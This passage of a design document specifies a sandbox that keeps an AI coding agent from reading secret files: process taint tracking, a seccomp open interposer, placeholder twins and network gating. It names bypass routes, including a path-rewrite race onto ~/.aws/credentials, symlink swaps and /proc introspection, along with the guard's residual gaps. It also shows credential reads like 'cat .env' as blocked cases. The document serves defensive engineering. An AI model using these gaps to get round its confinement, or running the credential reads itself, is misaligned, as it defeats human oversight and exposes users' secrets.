  session, with the repair, `confidentiality.md` §7.2a "A placeholder in
  your repository".)

## 3. Semantics of the taint (Fig. 2)

### 3.1 The taint

```
taint(process) = max over every secret file the process opened raw
                 (level, and the set of files, for the bindings)
```

- Set at the moment the interposer grants a raw open (§4.1), **before** the
  descriptor is injected, so a process is never raw-reading while
  unrecorded.
- **Monotone for the life of the process.** A dev server that loaded `.env`
  at start is tainted until it exits.
- **Inherited by children** across `fork`/`clone`/`execve`. The provenance
  registry's process lineage (`processLineage`, `arbiter/ipc/protocol.ts`)
  models parent→child edges; this plan adds a confidentiality level next to
  the integrity origin it stores.
- Keyed by proc key `${pid}-${starttime}` (`fs-provenance.md`), which
  defeats pid reuse.

### 3.2 Composition: the strictest rule in the tree (decided)

A tool call returns one stdout blob, so the rule that governs it is the most
restrictive rule of any tainted process in the call's tree:

- `psql -c '…'` at the top of a Bash tool call: psql is the only tainted
  process, rule (ii) applies, the model reads the rows.
- `. ./.env && psql -c '…'`: bash is tainted by `.env` under rule (i), so
  the whole blob is secret even though psql alone would be clear.
- Per-process, per-pipe attribution of bytes is the precise answer and
  needs per-fd tracking. It is out of scope; the fold is fail-closed and
  cheap, and a user who wants psql's rows readable runs psql at the top of
  the command.

The fold subsumes pipe propagation *inside* a tool call: whatever any
process in the tree read raw, the blob carries. Pipes *across* tool calls
(a tainted daemon answering a later client) are an IPC channel, handled in
§6.

### 3.3 Non-readers are denied once a reader list exists (decided)

With no reader list, every program gets the structured twin (§2.4). Once a
file names its readers, a program that is not the LLM and not on the list
gets **EACCES** on the open, not the twin: the list is the user's exhaustive
statement of who uses this file, a program that parses the file gets
nonsense from a placeholder anyway, and `git add -A` committing the twin is
a silently wrong result where a loud error is available. `others: twin` on
the entry restores the baseline for the rest. So, for a file with
`readers:`:

- `git add -A` with a tracked `.env`: `error: open(".env"): Permission
  denied`, the add fails, the agent skips the file.
- `cat .env`, `grep KEY .env`: `Permission denied`, with a `[mandu:secret]`
  note on the tool result naming the file and the way out (list a reader,
  or ask the human), so the model can say *why* rather than retry (§11.8).
- The LLM's own read is the one placeholder that remains: the agent process
  opens `.env` and receives the twin.

### 3.4 Interaction with the session watermark

A rule-(i) tool result is a **symbol**, not an in-context read, so it does
**not** raise the session watermark (`confidentiality.md` §4). Over-taint
at process granularity stays at process granularity: one masked deploy does
not turn the rest of the session HIGH. The e2e suite pins it (§8).

### 3.5 Interaction with the integrity axis

`confidentiality.md` §7.1 clause three stands: **an untrusted-lineage
process is never a reader**, whatever the list says. In `full` mode a
process whose lineage carries an integrity taint (`isProcessTainted`) is
denied every secret open. In `secrets` mode (integrity off) there is no
lineage taint to consult and the reader list alone decides; the copy says
so.

## 4. Enforcement per chokepoint

| Chokepoint | Before this plan | This plan |
|---|---|---|
| ② filesystem, open | bwrap bind of a one-line twin over every secret path; no per-process distinction | the twin is structured (§2.4) for everyone; with a reader list, the seccomp user-notification interposer (§4.1) decides per process: reader ⇒ the guard opens the real file, records the taint, injects the fd; LLM process ⇒ twin fd; anyone else ⇒ `EACCES` (or the twin under `others: twin`) |
| ① model context, tool result | secret bytes never in the output | the proxy asks the arbiter for the call's taint (§4.2): (i) whole result ⇒ one secret symbol; (ii)/(iii) ⇒ value scan, then regex spans ⇒ symbols; a call the recorder cannot bind is masked whole while the session holds any raw read |
| ④ network, `connect()` | net-guard allows a static launch-time host set | a tainted process may connect only to the intersection of its secrets' `bindings` (§4.3, Plan 13 D1); anything else is denied in-kernel and surfaces as an Inbox row exactly like an unbound symbol release |
| ② filesystem, write | derived label at the session watermark (`confidentiality.md` §8) | derived label at the **process** taint: a write-intent open by a tainted process mints `derived_labels(path, level)` before the writer gets its descriptor (§8 phase 3); the next reader of that path is gated as a labelled file with **no** reader list (the twin for every program until a human names an opener, Plan 13 D4). The guard keeps derived paths in a live index pulled from the arbiter, and the label follows `rename` and `link`. A copy whose sources are known is labelled by reference to them, so it goes where all its sources go (Plan 13 §4.6) |
| ③ exec, spawn | lineage edges | lineage edges carry the confidentiality level; a child of a tainted parent starts tainted |
| reply filter | resolves symbols for the human | unchanged; a rule-(i) result is shown to the human in full |

### 4.1 The interposer

A whole-agent **seccomp user-notification supervisor on the open family**,
with a supervisor-side open and `ADDFD` (proposed in
`rootless-confinement-ubuntu-2404.md` §10). It is the same process as the
unprivileged `connect(2)` supervisor (`net-guard`,
`interceptors/net-supervisor/src/guard_kernel.rs`): **one guard per
launch**, because the taint map must be consulted at `connect()` by the
process that populated it at `open()`, with no arbiter round trip on the
syscall path.

Per notification, for an open whose file is a registered secret:

1. identify the process: pid → proc key, `/proc/<pid>/exe` → app (§2.3);
2. `EACCES` if it has an integrity taint (§3.5), or is not a reader and not
   the agent process (and `others` is not `twin`);
3. otherwise open the real file in the guard, record the taint
   (`decideSecretOpen` records before it answers), then `ADDFD`. The open
   never truncates (`supervisor_open_flags`): the reader's `O_TRUNC` is
   applied to the descriptor (`ftruncate`) once every refusal of the open is
   behind (the taint sweep's included) and before `ADDFD`, so a refused
   open has not emptied the file and an allowed one behaves as the
   kernel's would (`secret_open::truncate_after_lookup`; a read-only
   descriptor is truncated through a writable reopen, Linux truncating
   `O_RDONLY|O_TRUNC` for an opener that may write). Until 2026-10-10 the
   flag was dropped outright, so a reader that rewrote its file shorter
   (`aws configure` rewriting `~/.aws/credentials`) left the longer
   value's tail behind the new one: a corrupt credential file, no leak
   (the tail stays in the real file, which only readers get). Keeping the
   flag, rather than refusing a reader's write, is the least surprising
   answer: the reader may already write the file and `ftruncate` its own
   writable descriptor, so the truncation gives it nothing it lacked, and
   refusing would break every allow-listed tool that updates its own
   credentials;
4. the agent process, and a non-reader under `twin`, gets the twin's
   descriptor. Under the bind the guard hands over the twin re-opened by
   the path the agent named (`secret_open::view_reaches_twin`), because
   Claude Code's Read refuses a descriptor that names another path than the
   one it checked; without a bind the twin is opened by its own path
   (`<scope>/secret-twins/NNN-name`).

"Is a registered secret" is decided by the path as spelled, its resolved
form, and failing both its `(st_dev, st_ino)` (`SecretIndex::lookup_with`),
so a hard link under another name, or a different-case spelling on a
case-folding filesystem (WSL's drvfs), is served as the secret.

**A write lands in the twin, and the launcher names it (2026-10-09).** A
write-intent open served the twin gets it by its own path, with the
tracee's `O_TRUNC`/`O_CREAT` kept for the twin only
(`supervisor_open_flags(flags, true)`); under the bind the twin is mounted
writable over the real path. Either way the program sees success, the real
file never changes, and the change goes with the scope dir at the session's
end. Writing through instead would put placeholder text over the user's
credential, and a rename onto or a removal of the file is refused (`EBUSY`
at the bind's mount point, `EACCES` from the guard; `write-protection.md`
§2), so `sed -i` and an editor's save fail. The loss used to be silent. The
launcher now snapshots each twin as written (size, SHA-256, device and inode;
`launcher/src/twin-writes.ts`) and, after the agent exits, prints one line
per registered file whose twin changed, was removed or was replaced, by path
only, on every display setting, and lists them on the `session_exit` event
(`discardedWrites`). A size is compared before any hash, so a twin grown by
gigabytes costs one `lstat`, not a read. The printed path has its C0, DEL,
C1 and Unicode format characters (`Cf`: the bidi overrides and isolates,
zero-width characters) and U+2028/U+2029 as `?`, so a directory name a
cloned repository chose can neither forge a line nor reorder it.

*The real file is checked, not assumed (2026-10-10).* The line says "the
real file is unchanged" only when it is: at launch the launcher also records
each real file's identity (device, inode, size, mtime and ctime) and, up to
16 MiB, its SHA-256, in its own memory only (a hash or a size of the real
bytes written down in the runtime base, which the agent can read, would be a
guessing oracle for a short secret). At the end another size is a change,
and otherwise the bytes decide, whatever the times say (2026-10-10: a
same-size write in the clock tick of the launch's mark keeps mtime and
ctime, seen in the CI guest, so the times never clear a hashed file); a
bigger labelled document, never hashed, is judged by its identity, and its
times moving counts as a change. The
real file can change in the same session: a reader the guard hands the real
file writes it (a raw verdict opens the real path for write), a write
through a hard link made before the launch reaches it under the bind, or the
user edits it meanwhile. Then the line says the real file also changed and
to check it before applying the change; when it cannot be read (now or at
launch) the line says Mandu could not check. When the scope dir is kept (a
non-zero exit, a named scope, `MANDU_KEEP_SCOPE_DIR`) the line says the copy
stays there until `mandu reap` instead of "discarded".

*A launcher that dies first (2026-10-10).* The lines need the launcher's own
end. A launcher killed by `SIGKILL`, one that crashes, one that gets
`SIGQUIT` (never forwarded to the agent, so its default action at any time)
and one that gets `SIGTERM` or `SIGHUP` during teardown (forwarded to the
agent before, default after, `spawn.ts`, `teardown-signals.ts`) leaves its
scope dir. So the twins' snapshots (nothing of the real files) are also
written beside the twins (`secret-twins/twin-snapshots.json`, 0600), the
launcher removes that file once it has printed its lines, and `mandu reap`,
before it removes a stale scope dir, reads the file through the open scope
and twin directories (never through a link, `safe-remove.ts`) and names each
file whose twin changed (`the session … ended before Mandu could say so:
…`). Reap does not claim the real file is unchanged: it holds no record of
it. The file is advisory: a program in the agent's tree that can write the
runtime base can alter it, which changes only what reap says. Residual: a
reboot or logout that empties `$XDG_RUNTIME_DIR` before reap runs loses the
twin with no line; reap is run by hand (no launch sweeps old scope dirs).

*A labelled file the launch did not register (2026-10-17).* The network
guard gates such a file at the open (confidentiality.md §6, "Read by a
program the launch did not see") and makes its twin on demand in
`secret-twins/derived-twins/`; a program's write through the gate lands
there, so the same silence had come back. The guard now records each such
twin as it makes it, in `derived-twins/labelled-twins.ndjson`, one line of
the twin's size, SHA-256 and identity and the real file's identity
(device, inode, mtime, ctime: never its size or a hash of its bytes), and
never makes a remade twin over an earlier one. After the agent exits the
launcher reads the records (through the open twin directory, each twin by
its own name there, `labelledDiscardedWrites`), names each labelled file
whose twin changed in the same line and `session_exit` field, judging the
real file by its identity as for a registered file over 16 MiB (the
record also holds when the guard looked: an unchanged identity clears the
real file only when its times lie more than 2 s before that look,
`REAL_TIME_SLACK_NS`, since a write in the same timestamp tick keeps them,
2026-10-17, CI pipeline 11426; else "could not check"), and
removes the records; `mandu reap` reads them for a launcher that died.

Left as it was: what a program writes into the twin is served as written to
every later open in the session, the agent's included, and is not
registered (the registry is the launch's snapshot), so a token a tool
refreshes there reaches the agent's world raw while the real file goes
stale; and a reader the guard hands the real file writes the real file
(now named as a change of the real file when the twin changed too), its
`O_TRUNC` applied as the kernel would (§4.1 step 3; kernel
`a_readers_shorter_rewrite_of_the_real_file_leaves_no_stale_tail` in
`local_exits_integration.rs`, red before 2026-10-10). Tests:
`launcher/test/unit/twin-writes.test.ts` (the checks, the wording, the
snapshot file, reap's lookup through links, the guard's labelled-twin
records), `tests/sandbox/secret-labelled-opens.test.ts` (a labelled file's
write named), `secret-setup.test.ts`,
`reap.test.ts`, `tests/sandbox/launcher/twin-write-notice.test.ts` (the
real launcher: the bind and guard-only; the real file edited mid-session
with the scope dir kept; the launcher SIGKILLed, then `mandu reap`).

The filter cannot select on the path (a pointer argument), so **every**
open in the agent tree traps (cost: §7.1), and every open that can read is
performed by the guard (§4.1a). `io_uring_setup` and `open_by_handle_at`
are refused whenever a secret policy is present; no descriptor predates the
filter (the launcher installs it before the agent's `exec`). The guard
needs `no_new_privs` only, no user namespace, so it confines a stock Ubuntu
24.04 without `mandu setup` (§8 phase 6). When it cannot start, the launch
falls back to the baseline of §11.7, never to `off`.

**Introspection.** `/proc/<P>/{fd,mem,environ,cmdline,…}`, `ptrace` and
`process_vm_*` of a tainted P are allowed only on the caller's own process,
on a P that holds nothing, or when the caller already carries every taint P
carries (`secret_open::introspection_allowed`, over
`TaintedSet::taint_sources`: P itself, its holding ancestors and the holders
it flows from by a descriptor, Plan 13 D2). The guard does not taint the
caller instead, since it cannot learn which secrets the bytes carry. So a
holder of one secret cannot read another holder's environment (another
secret, other bindings), and a reader shell's child argv (`curl -H
"Authorization: Bearer $KEY"`) is not visible to `ps` (§11.13.1). Kernel
tests: `a_holder_of_another_secret_cannot_read_a_holder`,
`a_tainted_process_in_its_own_pid_namespace_stays_uninspectable`,
`a_holders_argv_is_refused_to_an_untainted_reader`. Cost: a tainted `ps`
sees another holder's arguments only when it carries that holder's taint.

### 4.1a The CONTINUE race (built 2026-09-27)

**The gap.** Answering a non-secret open `CONTINUE` lets the kernel read
and resolve the path a second time; between the two another thread can
rewrite the path buffer (`~/decoy` → `~/.aws/credentials`) or a symlink can
be swapped in, and the kernel opens the secret raw with no taint. The
seccomp documentation says so: a `CONTINUE` cannot be a security decision
about pointer arguments. With 3000 opens of a flipping buffer the old guard
handed back the real bytes 757 times; the current guard never does.

**The guard performs every open that can read** (`guard_kernel::
handle_open_notif`, `fs_supervisor::tracee::open_as_tracee`):

1. the arguments are read once (`openat2`'s `open_how` too);
2. an `open`/`openat` with `O_PATH` of a non-secret path runs as issued, so
   it is the kernel's own `O_PATH` descriptor for any file type, a
   search-only directory included. A path swapped to the secret after the
   check yields the real file's `O_PATH` descriptor, which reads nothing
   (`EBADF`), and turning it into an open file is itself an open: a
   `/proc/self/fd/N` reopen is performed and judged by the inode reached
   (the twin), an empty-name `openat`/`openat2` is `ENOENT`, and the link
   family is trapped (proved by
   `an_o_path_descriptor_of_a_secret_never_becomes_its_bytes`, which holds
   such a descriptor from before the guard). A write-only open is
   performed and judged on the file it reached, `O_TRUNC` held back until
   the lookup (`write-protection.md` §2);
3. every other open is performed in the TRACEE's view, resolved once
   (`RESOLVE_IN_ROOT` under its root, `RESOLVE_BENEATH` from its cwd or
   dirfd), with its flags (plus `O_NOCTTY`) and its umask; the mode goes
   only with an open that creates (`O_CREAT` or `O_TMPFILE`'s own bit, the
   kernel's `WILL_CREATE`: `fs_supervisor::tracee::performed_open_mode`),
   since `openat2` refuses a mode on any other open where `open`/`openat`
   ignore it. Until 2026-10-17 every `O_DIRECTORY` open counted as a create
   (libc's `O_TMPFILE` carries the `O_DIRECTORY` bit), so the one-step
   open, the one a task in no Landlock domain takes (§4.1a: a launch with
   `--no-landlock-net`), carried the 0666 Bun passes on every open and the
   tracee got `EINVAL`: Claude Code stopped at start, "Error processing
   settings: EINVAL: invalid argument, open '/tmp/claude-<uid>'". The split
   open under the net-only wrap never passed the mode. A tracee's own
   `openat2` with a mode its flags do not take is answered the kernel's
   `EINVAL` (`openat2_mode_errno`);
4. the file actually opened is judged by the path its descriptor names and
   by `(st_dev, st_ino)` (`SecretIndex::lookup_opened`; a twin's inode
   counts as its secret): a secret takes §4.1's steps, anything else is
   injected. `ADDFD` cannot install an `O_PATH` file (its `fget` skips an
   `FMODE_PATH` file: `EBADF`, still so on 7.0), and answering `CONTINUE`
   would let the kernel read the `open_how` again, which another thread can
   have turned into a read of the secret. So an `openat2` `O_PATH` of a
   directory the tracee may list (GNU tar's parent open) is answered with
   the directory reopened `O_RDONLY | O_DIRECTORY`, as the tracee's own
   open would be (its Landlock domain; the context helper for a
   pseudo-filesystem directory), and any other `openat2` `O_PATH` (a file,
   a FIFO, a device, a socket, a symlink, procfs, a search-only directory)
   with `ENOSYS`, the answer of a kernel without `openat2`, so a caller
   that copes with one takes its `openat` path, which runs as issued (step
   2) and is the kernel's own (`secret_open::o_path_reply`). Until
   2026-10-17 those answered ADDFD's `EBADF`, and a search-only directory
   the stand-in's `EACCES`, which no caller reads as "use the other call".
   An `O_PATH` open of a registered secret, by any call, is the twin opened
   readable, never the real file (§4.1);
5. every failure is an errno, never `CONTINUE`; for a secret, an
   unreachable arbiter serves the twin.

The emulation preserves `/proc/self`, `/dev/fd/N`, `/dev/tty`, FIFOs,
`O_TMPFILE`, `O_NOFOLLOW`, `..`, dirfds, links to the secret (the twin) and
non-UTF-8 names (kernel test
`an_open_the_guard_performs_behaves_like_the_tracees_own`), and an
`O_DIRECTORY` open with a stray mode, in both open paths through a real
launch (`tests/sandbox/guard-direct-open-mode.test.ts`).

A scoped walk (`RESOLVE_BENEATH`, `RESOLVE_IN_ROOT`) fails `EAGAIN` when
any rename or mount anywhere on the machine lands while it walks a `..`
(the kernel cannot then prove the `..` stayed inside), and leaves the retry
to the caller; a plain `open`/`openat` never fails that way, so the guard
retries rather than hand the tracee an errno its own call could not get
(`fs_supervisor::tracee::openat2_retry_after`, also in the context helper):
eight attempts back to back, then pauses doubling from 100 us to 5 ms, 64 in
all (about a quarter second), after which the `EAGAIN` stands (an error,
nothing opened). Until 2026-10-17 it gave up after the eight back-to-back
attempts, which a burst of renames or mounts on a busy machine (a sandbox
starting up, git renaming its lock files) could outlast: a CI replay of
`git filter-branch` failed "index file open failed: Resource temporarily
unavailable" on `.git-rewrite/t/../index`. `RESOLVE_CACHED`'s own `EAGAIN`
is the tracee's and is not retried. Proved by
`an_open_walking_dotdot_through_rename_bursts_is_never_eagain` (kernel
test; 15-25 of 400 opens failed before) and
`a_dotdot_walk_racing_rename_bursts_is_never_eagain` (fs-supervisor). A storm
with no quiet longer than the pauses still answers `EAGAIN`. Known
differences: a tty opened without `O_NOCTTY` by a session leader does not
become its controlling terminal (`login_tty`'s `TIOCSCTTY` is unaffected);
`..` out of a magic link's target is `EXDEV`; an `openat2` `O_PATH` (a
kernel limit, step 4) of a directory is a read-only descriptor of it, and
of anything else, or of a directory the tracee may not list, `ENOSYS`: GNU
tar 1.35 has no `openat2` fallback, so `tar cf x.tar d/f` still fails when
`d` is search-only. The `open`/`openat` forms are exact, every target type
compared with the kernel's own answer
(`an_o_path_open_of_what_is_no_secret_is_the_kernels_own`).

**The descriptor handed over** (2026-10-18). ADDFD installs the guard's
own open file description in the tracee, and the kernel refuses to exec a
file while any description holds it open for writing (`ETXTBSY`). Until
2026-10-18 every handover was one `ADDFD` with `SECCOMP_ADDFD_FLAG_SEND`
and the guard closed its descriptor afterwards, so for that moment the
tracee ran on while the guard still held the file. A guard thread
descheduled in that moment made a program the agent wrote and ran at once
(`cp prog ws/p && ws/p`, a compiler's output, a downloaded tool) fail
"Text file busy" (CI pipelines 11765 and 11856: the workspace copy of tee
in `write-protect.test.ts` never ran, so it was never asked about; 96 to
182 of 2000 copy-and-run loops on a 4-vCPU guest, 0 of 6000 after). Fail-closed, but a
utility loss and a question never put. A descriptor that holds its file
for writing (`secret_open::holds_for_writing`, by `F_GETFL`: a performed
write-capable open, a memfd) is now handed over in order
(`guard_kernel::hand_over`): `ADDFD` without `SEND`, which installs it while
the tracee's call waits, then the guard's close, then the answer with the
installed number. A read-only descriptor keeps the one-step `SEND` (no
`ETXTBSY` is possible, and a raw secret read stays atomic with its taint,
`taint_then`). The cost is one more wake of the tracee per write-capable
open. What the order gives up: a tracee whose call is interrupted (a
signal, a kill) between the install and the answer keeps the descriptor
in its table, the one the guard had decided to give it, under a number its
call never returned. Proved by `a_program_written_through_the_guard_runs_at_once`
(kernel test: a control that keeps the guard's descriptor open while the
tracee runs gets `ETXTBSY` every time, the ordered handover never) and
`tests/sandbox/guard-written-exec.test.ts` (copy-and-run loops side by side
under the real launch). The kernel test runs its guard side in a
single-threaded process of its own: in the test binary every other test's
thread forks, and a child forked while the guard side held its descriptor
kept a copy (`O_CLOEXEC` closes only at an exec), so its first form failed
on master (pipeline 11893) with the order already right. The guard itself
forks only its context helpers, which close every inherited descriptor
first thing (`helper_main`), and runs a program only through an exec that
closes them; in that window a descriptor in flight on another thread is
held a moment longer, the same residual as a descheduled close, which
nothing measured has met.

**Pseudo-filesystems** (`context_helper.rs`). On procfs, sysfs and cgroupfs
the kernel judges the OPENER (bwrap's `uid_map` write, `/proc/<pid>/mem`'s
ptrace check, which the guard as an ancestor would pass where the tracee is
refused, per-namespace hostnames). Such a file is reopened by a helper
process forked from the guard that joins the tracee's namespaces along its
user-namespace chain, drops to its capability sets, sets `no_new_privs`,
applies its mirrored Landlock domain, and reopens the guard's descriptor
(nothing is resolved again). A tracee with another uid is refused. Proved
by `a_pseudo_file_is_opened_with_the_tracees_namespaces_and_rights` and a
real launch (`ps`, `df`, `unshare -r`, `git`, `node`, `python3` work).

**Landlock** (`landlock_mirror.rs`). An open the guard performs would
escape the tracee's own Landlock domain. The guard traps
`landlock_restrict_self`, copies the ruleset (`pidfd_getfd`), and runs that
task's accesses (opens, and the connects it performs, `exec-routing.md`
§7.5; `model-endpoints.md` §1.8 item 5) on mirror threads restricted with
the same stack; a stack it cannot mirror refuses the tracee's call
(`EPERM`), so a sandbox is never bypassed. A sandbox set up in its own pid
namespace is also recorded for that namespace, so a double-forked orphan
stays in it. Residue: a sandbox without its own pid namespace (Codex's own
Linux sandbox, off by default under the command box) keeps that lineage
gap (`guarantees.md` §3). Proved by
`a_sandboxed_tracees_opens_stay_in_its_sandbox` and
`a_double_forked_orphan_stays_in_its_sandbox`.

**The cost of the mirror** (2026-10-05). The whole agent tree is in a
Landlock domain: the launch's own wrap, `mandu-landlock-apply --net-only`
(the TCP port confine), which the guard's direct child installs before the
agent runs. So every open in the tree ran on a mirror thread, two
cross-thread handoffs on top of the open: about 0.3 to 0.55 ms an open on
an idle host (`open`+`close` of a small file 3 µs bare, 25 µs for a
trapped `stat`), and more under load, since each handoff waits for a
wakeup. A command-box command pays a few hundred trapped calls, so this was
most of the boxed commands' cost after bwrap's own (the real-config
differential lane's fixture hooks and statusline run a dozen boxed commands
a turn). The wrap's ruleset handles no file access (`plan_net_confine`:
`handled_access_fs` 0), and a Landlock domain whose every layer handles
none allows every file access, as no domain does; so for a task whose
domain is that layer alone the guard runs the same split open (resolve
`O_PATH`, reopen) on its own thread (`launch_wrap.rs`,
`Domain::governs_files`). Which layer is the wrap's comes from what the
guard knows, never from the tracee: the guard's own target argv must be the
applier by absolute path with `--net-only` (neither `--clean` nor
`--seccomp-only`), and the launch restriction (the direct child's first,
while its image is the applier) must come from a process whose command line
is exactly that argv and whose executable is the very file (`st_dev`,
`st_ino`) the argv named at the guard's start; anything else keeps the
mirror. Unchanged on purpose: a pseudo-filesystem file is still reopened by
the context helper under the WHOLE mirrored domain, because Landlock's
ptrace scoping, which every domain carries whatever rights it handles,
decides `/proc/<pid>/…` (another process's `environ` stays refused); the
mutating steps (`perform_under_domain`) and the connects keep the mirror;
any nested layer (the box's applier, a program's own sandbox) makes the
domain govern files again. Measured with a launch on a test host (kernel
7.0): an open under the wrap 289 to 547 µs before, 44 to 137 µs after; a
boxed `head` about 106 ms before, 89 ms after (best of interleaved runs);
the fixture statusline's run about 1.39 s before, 1.2 s after. Proved by
`tests/sandbox/wrap-open-fast-path.test.ts` (the decisions under the real
wrap: a plain file, the twin of a credential file, another process's
`environ` refused, a nested sandbox still confining; and which path ran,
by the guard's own count, `MANDU_NET_GUARD_OPEN_STATS`, written at its
exit: the tree's opens on the guard's thread, the nested sandbox's through
its mirror) and the unit tests in `launch_wrap.rs`. No timing assertion:
the mirror's cost is wakeup latency, a median 0.3 to 0.4 ms an open on the
busy test host against 0.06 ms in an idle CI guest, so the test reports the
medians as a diagnostic only. What is left of a boxed command's cost (about 90 ms on
that host): bwrap's namespaces and mounts under the guard (about 50 ms,
22 ms bare), the box's host-socket scan (about 13 ms a command) and the
`bwrap --help` capability probe each `mandu-exec-box` runs (about 7 ms).
The probe is now asked once by the launcher and kept by the bubblewrap's
content hash (2026-10-09, exec-routing.md §4, "The bwrap probe, kept by
content"); the socket scan stays per command, since which host sockets
exist is its security input.

**The mirror's records over a session** (2026-10-11). A wrapped Stop hook
(the real-config differential lane's fixture hook: a `sh` script running a
boxed `sed` and `head`) grew from about 270 to 600 ms over a session.
Reproduced with the real launcher, the guard and the command box, a bash
agent running the hook 300 times: 166 ms at the start, 290 ms at the end.
Per run, the arbiter's answers stayed flat (every op under 0.2 ms, timed
in the test's arbiter), an unboxed `/bin/true` stayed at 9 ms, a boxed
`head` grew from 79 to 141 ms and a bare `bwrap --unshare-all true` run
inside the tree from 37 to 75 ms (19 ms outside Mandu, flat), while the
guard's threads grew from 49 to 512, nearly all `guard-landlock`. The
mirror keeps a record per task it looked up (its domain, or none), and a
record holds its domain, whose mirror threads and copied ruleset
descriptors live as long as it does; the records of gone tasks were swept
only once 4096 had piled up. Every boxed command restricts itself once
(the box's applier), so the guard kept a mirror thread per boxed command
of the session, and the per-box work grew with them (each box's new
namespaces get a context helper forked from the guard, whose address space
and descriptor table those threads and descriptors fill). The sweep now
runs when the record map holds twice what the last sweep left, at least
64 (`mirror_records`): about two `/proc` reads per record added, and the
records of gone tasks at most 64 plus twice the live ones. A record is
dropped only when its proc key names no live task (the process is gone,
or its pid names another start time); a lookup starts from a live task's
own key and walks live parent links, so a gone task's key is never looked
up again and dropping it changes no answer, and a live sandbox keeps its
domain through its own record or its pid namespace's. Measured after, same
host and harness: the guard's threads stay between 15 and 30, the hook
153 ms at the start and 180 to 200 ms from its 100th run on (the host's
load, 65 to 110, moved it by as much), a boxed `head` 72 to 95 ms.
`tests/sandbox/guard-mirror-records.test.ts` (the real launcher and guard:
400 short-lived processes each sandbox themselves and stay confined, the
guard's own count shows 400 mirrors and at most 62 mirror threads alive at
once where the old sweep kept 402, and a sandbox started before the churn
and a child it forks after it are still confined) and the
`mirror_records` unit tests (the schedule, the liveness test, the
two-reads-per-record bound).

**Cost.** Notifications are taken on up to 64 receiving workers (a FIFO or
a held ask never stalls the rest). A call that can block for long (a
connect, a delete or rename, a call root's exec, which asks the arbiter
before it goes) is handled on a thread of its own;
when no thread can be made (a task or memory limit), the call is refused
with `EAGAIN`, never continued (2026-10-17, `on_own_thread`). Any other
exec is read and let go on the worker that received it, and its record
is sent from a thread made after the `CONTINUE` (or from the worker when
none can be made: the exec is already answered); a thread per exec held
each exec about 100 µs before its first read (2026-10-18,
runtime-instances.md §14.8). Before, the
failed spawn panicked, ended the worker that held the notification, and
left the tracee suspended in that call for good. When the tree is gone the
supervisor waits up to 5 s for its own handlers still running (`DRAIN`,
counted per supervisor since 2026-10-17). A process-wide count made a
clean run's supervisor wait out the agent's handlers, and in the kernel
tests, where dozens of supervisors share one process, nearly every guarded
run's end waited the whole 5 s. `guard_integration.rs` took 32 s alone on
a dev host before the change and 12 to 18 s after. The performed guard is faster than
the `CONTINUE` guard it replaced on every row of §7.1 (build/test within 2
% of bare). A performed open of a file that is no secret cost the guard
33-40 µs warm and 62-73 µs in a fresh process (a dynamically linked
program's loader opens `ld.so.cache` and libc in each) on a 128-CPU host
(2026-10-18, runtime-instances.md §14.9). The decision is 1-6 µs of it, in
memory; the rest is the performed open, the handover and the syscalls
around them. Two `fstatfs` an open (2.5 µs each on ext4 there) are now
asked only for a file on an anonymous device (major 0), the only kind a
pseudo filesystem has, and the opened descriptor is `fstat`ed and
`readlink`ed once for every check: 23-30 µs warm, 50-56 µs fresh. A
`CONTINUE` for files no label could reach was refused: it reopens this
section's race whatever the first path named. Tests: the kernel tests
`a_path_rewritten_mid_open_never_reads_the_secret` and
`a_symlink_swapped_mid_open_never_reads_the_secret`,
`tests/sandbox/guard/tar-secret.test.ts`,
`tests/sandbox/launcher/tar-twin.test.ts`, and
`launcher/test/secret-readers-live.test.sh` (4f).

### 4.2 The tool result

The proxy needs to know, per `tool_result`, which process tree produced it.
One arbiter op, `callTaint(callId) → { level, files, rule }`, computes the
fold of §3.2 over the lineage under the call's root, and the proxy applies:

- rule (i): the whole `tool_result` text becomes one symbol
  `$MDU:nomodel_Exec[hash]` at `level`, with `origin` naming the files, so
  the dashboard can say "masked because `deploy.sh` read `.env`";
- rule (ii)/(iii): the value scan, then the reader's `mask` regexes, each
  hit its own symbol; the rest raw;
- plus the `[mandu:secret]` note (§11.8) whenever a raw open was granted or
  denied during the call.

**The root.** The guard marks an exec by the agent's own child as a call
root (`recordExecRoot` `callRoot`); the arbiter binds the call to it by
command text between the proxy's gate of the call and its first ask
(several same-text matches are folded together). The command text is the
one the model proxy recorded when it relayed the call (`execGate`,
`recordCallCommand`, on the human plane), never the one the agent echoes
back in its next request (Plan 13 §3 D7, D9).

**The lineage.** The guard sends the opener's or exec'er's whole live
ancestor chain (stopped below the guard) at every exec and every secret
open, and the arbiter keeps the first edge of each child (a later parent is
a reparenting), so a subshell that never execs (`( cat x; true ) | …`) is
linked to its parent (Plan 13 D7; `exec-routing.md` §7.5).

**Fail-closed direction.** A call the recorder cannot bind is masked whole
(rule (i), the strictest level of every raw read of the session) while the
session holds any raw read, whatever the classify verdict. If the arbiter
has a raw-open record for the call and cannot compute the fold, the result
is rule (i). The interposer records before it injects, so "no record"
means no raw bytes were handed out.

### 4.3 The network exit

The guard's per-connect decision (`GuardPolicy::decide_matched`) has a
process-aware leg: a tainted process's destination must be admitted by the
`bindings` of EVERY secret it (or an ancestor) read, their intersection
(Plan 13 D1; holding two data, a holder may send only where both may go, as
a derived symbol's release does, `symbolizeDerived`). `intersectBindings`
keeps a narrower host below a bare or `*.suffix` binding, by the one
binding rule the gate and the net-proxy match by (confidentiality.md §2.2),
and compares a CIDR and a `unix:` path by equality; a file with Plan 13
§5.2's `values:` counts as the intersection over its values. The static launch-time
allow set still applies underneath. A denied connect returns `EACCES`
in-kernel and the guard emits the same `egress:tainted-process-unbound`
shape the net-proxy emits, naming the secret files and the bindings, so the
Inbox row, the SIEM rule and the dashboard story are the existing ones.
Approval remembered per {file, destination} makes the second `curl` to an
approved host silent. An unreachable arbiter refuses.

The same decision is made for every send that names an address (`sendto`,
`sendmsg`, `sendmmsg`), and for every INET socket a process (or a
descendant) holds at the moment it becomes tainted: the guard records the
taint, waits (bounded) for the egress it judged before, judges each held
socket's peer, and refuses the raw open when one is unbound, so a socket
connected before the read never carries the bytes (`exec-routing.md`
§7.5). Loopback is excepted only for the launch's net-proxy port over TCP,
not the address. The net-proxy applies the same rule on every proxied leg
(§8 phase 3).

**AF_UNIX.** A tainted `psql` talking to a local PostgreSQL uses an AF_UNIX
socket, so a binding can name a socket path prefix
(`unix:/var/run/postgresql`), and a tainted process's AF_UNIX `connect()` is
gated like INET, with the arbiter's own socket always allowed. Without
this, IPC would be the laundering channel of §6.

## 5. The examples (Fig. 3)

| | app | reader of | after the open | model sees | network |
|---|---|---|---|---|---|
| a | `claude` `Read(".env")` | never | placeholder | the structured twin (keys raw, values symbols) | n/a |
